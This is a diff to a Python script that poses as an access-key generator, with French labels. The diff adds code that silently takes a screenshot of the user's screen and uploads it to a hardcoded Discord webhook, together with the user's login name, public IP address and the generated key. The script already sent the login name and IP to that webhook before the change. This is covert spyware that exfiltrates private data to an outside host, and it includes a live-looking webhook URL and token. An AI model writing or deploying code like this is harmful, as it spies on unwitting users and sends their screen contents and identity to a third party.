@@ -6,6 +6,7 @@ import socket
 import requests
 import uuid
 import subprocess
+import pyautogui
 
 ACCESS_KEY_FILE = "access_key.txt"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1238577456827334656/e1gMp2TstQ56pvSvQsX-tLb0BKkVooSrVGnC91uGS1dmbJG5FWe6kkI3PXyS_bgChe9D"
@@ -16,15 +17,24 @@ def generer_et_envoyer_cle():
     try:
         cle_acces = str(uuid.uuid4())
         session_utilisateur = subprocess.check_output('whoami').decode().strip()
-        
+
+        screenshot = pyautogui.screenshot()
+        screenshot_path ="screenshot.png"
+        screenshot.save(screenshot_path)        
+
         reponse = requests.get("https://api.ipify.org")
         adresse_ip_publique = reponse.text
-        
-        message = {"content": f"Nouvelle clé d'accès générée par {session_utilisateur} depuis l'adresse IP publique : {adresse_ip_publique}\nClé : {cle_acces}",
-                   "username": "Générateur de clés"}
-        reponse = requests.post(WEBHOOK_URL, json=message)
-        reponse.raise_for_status()
+
+        message = f"Nouvelle clé d'accès générée par {session_utilisateur} depuis l'adresse IP publique : {adresse_ip_publique}\nClé : {cle_acces} !"
+
+        with open(screenshot_path, "rb") as file:
+            files = {"file": file}
+            data = {"content": message, "username": "Générateur de clés"}
+            reponse = requests.post(WEBHOOK_URL, data=data, files=files)
+            reponse.raise_for_status()
+
         print("Clé d'accès envoyée avec succès !")
+
         with open(ACCESS_KEY_FILE, "w") as f:
             f.write(cle_acces)
     except Exception as e:
